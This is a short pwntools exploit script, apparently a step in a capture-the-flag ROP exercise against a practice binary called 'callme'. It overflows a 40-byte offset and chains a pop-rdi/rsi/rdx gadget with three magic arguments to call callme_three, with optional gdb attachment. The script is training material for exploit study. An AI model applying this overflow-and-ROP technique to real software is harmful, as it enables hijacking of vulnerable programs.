#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# step 2 : call callme_tree with de good parameters 
# break to ret in pwnme function
gs='''
b *pwnme+89
'''

# Set up pwntools for the correct architecture
elf =  ELF('callme')
context.binary=elf
context(terminal=['tmux', 'split-window', '-h'])

# Offset to return address
offset=0x28

# get the adress of the 3 function in the PLT
callme_one=elf.plt['callme_one']
callme_two=elf.plt['callme_two']
callme_three=elf.plt['callme_three']

# pop rdi ; pop rsi ; pop rdx ; ret
pop_3=0x40093c

io = process([elf.path])

if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(.5)

print(f"{callme_one=:x}")

# io.recvuntil(b"> ")

# Build payload
PL =b"A"*offset
PL+=p64(pop_3)
PL+=p64(0xdeadbeefdeadbeef)
PL+=p64(0xcafebabecafebabe)
PL+=p64(0xd00df00dd00df00d)
PL+=p64(callme_three)

io.sendline(PL)
io.interactive()

